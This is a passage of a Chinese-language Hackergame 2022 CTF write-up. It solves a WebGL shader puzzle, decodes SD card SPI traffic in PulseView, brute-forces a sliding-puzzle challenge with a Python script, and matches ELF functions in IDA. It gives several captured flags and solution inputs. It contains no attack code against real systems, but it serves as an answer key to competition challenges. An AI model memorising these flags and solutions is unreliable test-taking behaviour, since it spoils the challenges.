打开发现是一个 WebGL 渲染的场景，其中 flag 的内容被挡住了。所有内容都是在前端的，存下来就可以本地调试。

发现其中的主要场景渲染代码都在 fragment-shader.js 中。可以发现由一些 sdf 组成，最终的场景也是由几个 sdf 结果取 min 而来的。

看起来 t5SDF 的代码最短，可能是施加的遮盖。所以将 sceneSDF 中 t5 相关的部分删掉，再打开页面运行即可看到完整 flag：**flag{SDF-i3-FuN!}**

![](/assets/images/writeups/hackergame2022/sdf.png)

-----

## 片上系统
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)
![](https://img.shields.io/badge/-BIN-inactive?style=flat-square)

> 最近，你听说室友在 SD 卡方面取得了些进展。在他日复一日的自言自语中，你逐渐了解到这个由他一个人自主研发的片上系统现在已经可以从 SD 卡启动：先由“片上 ROM 中的固件”加载并运行 SD 卡第一个扇区中的“引导程序”，之后由这个“引导程序”从 SD 卡中加载“操作系统”。而这个“操作系统”目前能做的只是向“串口”输出一些字符。
> 
> 同时你听说，这个并不完善的 SD 卡驱动只使用了 SD 卡的 SPI 模式，而传输速度也是低得感人。此时你突然想到：如果速度不快的话，是不是可以用逻辑分析仪来采集（偷窃）这个 SD 卡的信号，从而“获得” SD 卡以至于这个“操作系统”的秘密？
> 
> 你从抽屉角落掏出吃灰已久的逻辑分析仪。这个小东西价格不到 50 块钱，采样率也只有 24 M。你打开 PulseView，把采样率调高，连上室友开发板上 SD 卡的引脚，然后接通了开发板的电源，希望这聊胜于无的分析仪真的能抓到点什么有意思的信号。至于你为什么没有直接把 SD 卡拿下来读取数据，就没人知道了。
> 
> **引导扇区**
> 
> 听说，第一个 flag 藏在 SD 卡第一个扇区的末尾。你能找到它吗？
> 
> **操作系统**
> 
> 室友的“操作系统”会输出一些调试信息和第二个 flag。从室友前些日子社交网络发布的终端截图看，这个“操作系统”每次“启动”都会首先输出：
> 
> > LED: ON  
> > Memory: OK
> 
> 或许你可以根据这一部分固定的输出和引导扇区的代码，先搞清楚那“串口”和“SD 卡驱动”到底是怎么工作的，之后再仔细研究 flag 到底是什么，就像当年的 Enigma 一样。

第一部分直接使用 PulseView 软件读取 binary 文件，得到信号，然后添加 SD card（SPI mode）解码器，将几个信号接上，就可以在 MOSI data 中看到 flag

![](/assets/images/writeups/hackergame2022/sd.png)

dump 出来然后转换即可得到 flag：**flag{0K_you_goT_th3_b4sIc_1dE4_caRRy_0N}**

第二部分试图逆向后面的 RISCV 指令，但完全看不出什么有意义的东西，怀疑是数据搞错了，懒得修，罢了。

-----

## 企鹅拼盘
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

> 这是一个可爱的企鹅滑块拼盘。（觉得不可爱的同学可以换可爱的题做）
> 
> 和市面上只能打乱之后拼回的普通滑块拼盘不同，这个拼盘是自动打乱拼回的。一次游戏可以帮助您体验到 16/256/4096 次普通拼盘的乐趣。
> 
> 每一步的打乱的方式有两种，选择哪一种则由您的输入（长度为 4/16/64 的 0/1 序列）的某一位决定。如果您在最后能成功打乱这个拼盘，您就可以获取到 flag 啦，快来试试吧wwwwww

第一部分输入只有四个 bit，直接手动试就能试出来答案是 1000，flag：**flag{it_works_like_magic_……}**

第二部分输入有 16 个 bit，可以用代码爆破一下，将题给代码中的主逻辑复制出来，枚举输入跑一下：
```python
import json
from tqdm import tqdm
from sys import argv

class Board:
    def __init__(self):
        self.b = [[i*4+j for j in range(4)] for i in range(4)]

    def _blkpos(self):
        for i in range(4):
            for j in range(4):
                if self.b[i][j] == 15:
                    return (i, j)

    def reset(self):
        for i in range(4):
            for j in range(4):
                self.b[i][j] = i*4 + j

    def move(self, moves):
        for m in moves:
            i, j = self._blkpos()
            if m == 'L':
                self.b[i][j] = self.b[i][j-1]
                self.b[i][j-1] = 15
            elif m == 'R':
                self.b[i][j] = self.b[i][j+1]
                self.b[i][j+1] = 15
            elif m == 'U':
                self.b[i][j] = self.b[i-1][j]
                self.b[i-1][j] = 15
            else:
                self.b[i][j] = self.b[i+1][j]
                self.b[i+1][j] = 15

    def __bool__(self):
        for i in range(4):
            for j in range(4):
                if self.b[i][j] != i*4 + j:
                    return True
        return False

with open("chals/b16_obf.json") as f:
    branches = json.load(f)

b = Board()
start = ...
end = ...
for i in tqdm(range(start, end)):
    b.reset()
    bits = bin(i)[2:].zfill(16)
    for branch in branches:
        b.move(branch[1] if bits[branch[0]] == '1' else branch[2])
    if b:
        print(bits)
        break
```
爆破出结果为 0010111110000110，flag：**flag{Branching_Programs_are_NC1_……}**

第三部分太复杂了，应该爆破不出来，毕竟这是一道 math 题，开摆。

-----

## 火眼金睛的小 E
![](https://img.shields.io/badge/-REVERSE-inactive?style=flat-square)

> 小 E 有很多的 ELF 文件，它们里面的函数有点像，能把它们匹配起来吗？
> 
> 小 A：这不是用 BinDiff 就可以了吗，很简单吧？

只做了右手就行的第一部分，也就是两次达到 100% 正确。拖进 IDA 中硬看，找 CFG 图以及汇编代码比较类似的函数即可，时限也很长，不用着急，很容易就能找到相似的函数。提交拿到 flag：**flag{easy_to_use_bindiff_……}** （笑死，根本没用 bindiff）

第二部分要求一个小时内完成 100 题中的 40 题，第三部分要求三小时内完成 200 题中的 60 题，不想做，开摆。